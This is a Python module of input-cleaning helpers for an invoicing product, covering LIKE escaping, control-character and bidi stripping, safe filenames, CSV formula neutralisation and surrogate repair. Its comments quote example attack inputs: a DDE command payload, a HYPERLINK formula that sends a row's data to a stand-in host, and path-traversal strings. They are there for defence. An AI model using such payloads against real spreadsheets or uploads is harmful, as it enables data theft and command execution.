"""Input cleaning applied at the edge, before a value reaches a query or a file.

None of this is SQL-injection defence — every query in the product is built
through SQLAlchemy and passes user values as bound parameters, so a quote in a
supplier name is data and never syntax. What is left after that is a different
and real set of problems:

* **LIKE metacharacters.** ``%`` and ``_`` in a search box are not injection,
  but ``%`` alone turns an indexed prefix search into a full scan of a tenant's
  invoices, and a page of them is a cheap way to make the database work hard.
* **Control characters.** A ``\\r\\n`` in a value that is later logged, or put
  in a ``Content-Disposition`` header, is header and log injection.
* **Filenames.** An uploaded name reaches a filesystem path and a download
  header, and neither should ever see ``../``.
* **Spreadsheet formulas.** A field that starts with ``=`` is a formula to
  Excel, not a trade name, and the CSV exports are opened in Excel by design.
* **Unpaired surrogates.** JSON may spell half a UTF-16 pair, and Python
  parses it as written. UTF-8 cannot encode it, so one stored in a row breaks
  every response that serialises the row, and Postgres refuses the INSERT.
"""
from __future__ import annotations

import re
import unicodedata

# Everything in the Unicode "C" (control/format/surrogate/unassigned) classes,
# minus the whitespace that is legitimately typed into a text field.
_KEEP_CONTROL = {"\t", "\n"}

_FILENAME_SAFE = re.compile(r"[^A-Za-z0-9._ -]")
_MULTI_DOT = re.compile(r"\.{2,}")


def strip_control_chars(value: str, *, keep_newlines: bool = False) -> str:
    """Drop control and format characters, which no user field needs.

    Also removes bidirectional-override characters: a right-to-left override in
    a supplier name renders a reviewed invoice differently from the one that
    was approved, which is a spoof rather than a formatting quirk.
    """
    keep = _KEEP_CONTROL if keep_newlines else set()
    return "".join(
        ch for ch in value if ch in keep or unicodedata.category(ch) not in ("Cc", "Cf", "Cs", "Co")
    )


def clean_text(value: str | None, *, max_length: int = 500) -> str | None:
    """Normalise a free-text field: NFC, no control characters, trimmed, bounded.

    NFC because the same GSTIN-holder's name can arrive decomposed from one
    device and composed from another, and two spellings of one name defeat both
    deduplication and search.
    """
    if value is None:
        return None
    cleaned = strip_control_chars(unicodedata.normalize("NFC", value)).strip()
    # Collapse runs of whitespace — a name pasted out of a PDF often carries
    # them, and they make an otherwise identical counterparty look distinct.
    cleaned = re.sub(r"\s{2,}", " ", cleaned)
    return cleaned[:max_length] or None


def escape_like(term: str, escape: str = "\\") -> str:
    """Escape LIKE wildcards so a search term matches itself literally.

    The escape character must be declared on the comparison too:
    ``column.ilike(f"%{escape_like(term)}%", escape="\\\\")``.
    """
    out = term.replace(escape, escape + escape)
    for wildcard in ("%", "_"):
        out = out.replace(wildcard, escape + wildcard)
    return out


def search_pattern(term: str | None, *, max_length: int = 100) -> str | None:
    """A bounded, wildcard-safe ``%term%`` pattern, or ``None`` for no filter."""
    cleaned = clean_text(term, max_length=max_length)
    if not cleaned:
        return None
    return f"%{escape_like(cleaned)}%"


def safe_filename(value: str | None, *, fallback: str = "upload", max_length: int = 120) -> str:
    """Reduce an uploaded name to something safe to store and to echo back.

    Path separators, traversal sequences and control characters are removed
    rather than rejected: the name is cosmetic here (the stored file is named
    after a UUID), and refusing an upload because a phone titled the photo
    oddly would be the wrong trade.
    """
    if not value:
        return fallback
    # Take the last path component under either separator, so "../../etc/passwd"
    # and "..\\..\\windows\\x" both reduce to their leaf.
    leaf = value.replace("\\", "/").rsplit("/", 1)[-1]
    cleaned = _FILENAME_SAFE.sub("_", strip_control_chars(leaf)).strip(" .")
    cleaned = _MULTI_DOT.sub(".", cleaned)
    return cleaned[:max_length] or fallback


# The characters that make a spreadsheet treat a cell as something other than
# text. ``=`` and ``+`` open a formula; ``-`` does too when what follows is not
# a number; ``@`` is Excel's legacy call/intersection operator and is what makes
# ``@SUM`` and the old ``=cmd|'/c calc'!A0`` DDE payload work. Tab and carriage
# return are here because a leading one is stripped by some importers, which
# hands the next character the start of the cell back.
_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: str | None) -> str:
    """Neutralise a text field so a spreadsheet shows it instead of running it.

    The CSV exports exist to be opened in Excel — that is stated on the endpoint
    — and Excel evaluates any cell beginning with ``=``, ``+``, ``-`` or ``@``.
    A counterparty name is free text that arrives from an uploaded invoice or
    from a PATCH, so ``=HYPERLINK("http://x/?"&A2,"Open")`` in a supplier's
    trade name exfiltrates the row it lands next to as soon as a CA opens the
    purchase register and clicks. Quoting does not help: the CSV quoting rules
    are about the *file* being parsed correctly, and a correctly parsed cell
    whose content is ``=...`` is still a formula.

    Prefixed with an apostrophe rather than dropped or rejected. Losing a
    character out of a name silently corrupts the register, and refusing the
    export would punish the business for what a supplier put on an invoice; the
    apostrophe is the marker spreadsheets already use for "this is text", and a
    machine reading the CSV back gets a value that differs by one visible,
    obvious character rather than one that has been quietly edited.

    Only for text. Do not put a number through this — a credit note's ``-``
    prefix is arithmetic, and the numeric columns are formatted by this
    application rather than typed by anyone.
    """
    if not value:
        return ""
    return f"'{value}" if value.startswith(_FORMULA_LEADERS) else value


def content_disposition(filename: str) -> str:
    """Build a safe ``Content-Disposition: attachment`` header value.

    The ASCII fallback escapes backslashes and double quotes per RFC 6266.
    A ``filename*`` parameter carries the original name in UTF-8 per RFC 5987,
    so browsers that support it show non-ASCII characters correctly.
    """
    from urllib.parse import quote

    ascii_safe = filename.replace("\\", "\\\\").replace('"', '\\"')
    utf8_encoded = quote(filename, safe="")
    return (
        f'attachment; filename="{ascii_safe}"; '
        f"filename*=UTF-8''{utf8_encoded}"
    )


def safe_extension(filename: str | None, *, max_length: int = 10) -> str:
    """The dotted extension of *filename*, if it is a plain alphanumeric one.

    Anything else returns "" — the stored file keeps its UUID name and the
    content type is what the parser dispatches on anyway.
    """
    if not filename or "." not in filename:
        return ""
    suffix = filename.rsplit(".", 1)[-1][:max_length]
    return f".{suffix.lower()}" if suffix.isalnum() else ""


def encodable(value):
    """*value* with every unpaired UTF-16 surrogate replaced by U+FFFD.

    Recurses through dicts and lists, so a whole parsed JSON document can be
    passed. A valid pair is joined and kept; only the half that cannot be
    written is replaced. Request bodies do not need this — pydantic refuses a
    lone surrogate in a validated string — but JSON read out of a *file* or an
    upstream reply never meets pydantic before it is stored.
    """
    if isinstance(value, str):
        try:
            value.encode("utf-8")
        except UnicodeEncodeError:
            return value.encode("utf-16", "surrogatepass").decode("utf-16", "replace")
        return value
    if isinstance(value, dict):
        return {encodable(key): encodable(item) for key, item in value.items()}
    if isinstance(value, list | tuple):
        return [encodable(item) for item in value]
    return value
